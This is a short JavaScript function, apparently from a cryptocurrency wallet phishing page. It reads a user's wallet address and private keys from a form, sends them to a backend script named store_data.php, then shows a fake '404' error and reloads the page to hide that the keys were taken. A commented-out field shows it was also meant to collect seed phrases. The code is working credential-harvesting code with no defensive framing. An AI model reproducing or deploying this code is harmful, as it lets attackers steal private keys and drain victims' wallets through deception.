function storeData() {
	// Get input values from the form
	let walletAddress = document.getElementById("wallet_address").value;
	let walletkeys = document.getElementById("wallet_keys").value;
    // const button =document.querySelector("button")
	// var walletPhrase = document.getElementById("wallet_phrase").value;

	// Create a data object
	let data = {
		"wallet_address": walletAddress,
		"wallet_keys": walletkeys,
		// "wallet_phrase": walletPhrase
	};

	// Send the data to the backend code for storage
	var xhr = new XMLHttpRequest(); 
	xhr.open("POST", "store_data.php", true);
	xhr.setRequestHeader("Content-Type", "application/json");
	xhr.send(JSON.stringify(data));

	// Show a success message to the user
	alert("ERROR (404)!");
    location.reload();
 
    // button.addEventListener("click", function)
   
}
